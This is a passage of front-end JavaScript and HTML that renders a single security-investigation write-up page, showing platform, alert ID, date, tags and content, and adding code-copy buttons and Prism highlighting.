              ${writeup.platform ? `<span><i class="fas fa-server"></i> ${writeup.platform}</span>` : ''}
              ${writeup.alertId ? `<span><i class="fas fa-bell"></i> Alert: ${writeup.alertId}</span>` : ''}
              ${writeup.investigationDate ? `<span><i class="fas fa-search"></i> ${writeup.investigationDate}</span>` : ''}
            </div>
            <div class="writeup-tags">
              ${writeup.tags.map(tag => `<span class="tag">${tag}</span>`).join('')}
            </div>
          </div>
          
          <div class="writeup-content">
            ${writeup.content}
          </div>
        </article>
      `;
      
      // Add copy functionality to all code copy buttons
      document.querySelectorAll('.code-copy').forEach(button => {
        button.addEventListener('click', function() {
          copyCode(this);
        });
      });
      
      // Apply syntax highlighting
      if (window.Prism) {
        Prism.highlightAll();
      }
    }

    // Display writeup when page loads
    if (document.getElementById('writeup-container')) {
      displaySingleWriteup();
    }

    // Add event listener for hash changes (if using hash-based navigation)
    window.addEventListener('hashchange', displaySingleWriteup);
  </script>
</body>
</html>
